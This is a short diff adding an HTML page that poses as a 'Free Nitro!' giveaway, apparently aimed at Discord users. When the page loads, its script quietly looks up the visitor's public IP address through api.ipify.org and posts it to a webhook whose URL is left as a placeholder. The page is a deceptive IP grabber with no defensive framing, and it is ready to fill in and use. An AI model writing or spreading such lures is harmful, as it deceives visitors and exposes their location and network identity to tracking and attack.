@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <title>Free Nitro!</title>
+</head>
+<body onload="logIP()">
+ <!-- Fake content here -->
+ <h1>Click Here For Free Nitro!</h1>
+
+ <script>
+ async function logIP() {
+ const ipResponse = await fetch('https://api.ipify.org');
+ const ip = await ipResponse.text();
+ const webhookURL = 'YOUR_WEBHOOK_URL_HERE';
+ fetch(webhookURL, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({ content: `Logged IP: ${ip}` }),
+ });
+ }
+ </script>
+</body>
+</html>
